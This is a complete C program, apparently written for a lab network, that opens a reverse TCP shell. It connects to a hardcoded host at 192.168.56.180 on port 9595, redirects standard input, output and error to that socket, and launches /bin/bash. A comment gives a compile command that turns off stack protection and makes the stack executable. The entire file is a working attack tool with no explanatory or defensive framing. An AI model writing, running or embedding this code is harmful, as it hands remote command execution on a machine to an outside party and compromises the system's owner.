// author: Chase Hatch
// gcc -fno-stack-protector -z execstack reverse_tcp_shell.c -o reverse_tcp_shell.elf -g
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>


int main(int argc, char **argv[]){
	int sockuh, port;
	char IP[] = "192.168.56.180";   // black-seed
	port = 9595;
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_port = htons(port);
	sockuh = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockuh, (struct sockaddr *) &addr, sizeof(addr));
	dup2(sockuh, 2);
	dup2(sockuh, 1);
	dup2(sockuh, 0);
	execve("/bin/bash", NULL, NULL);
	return 0;
}

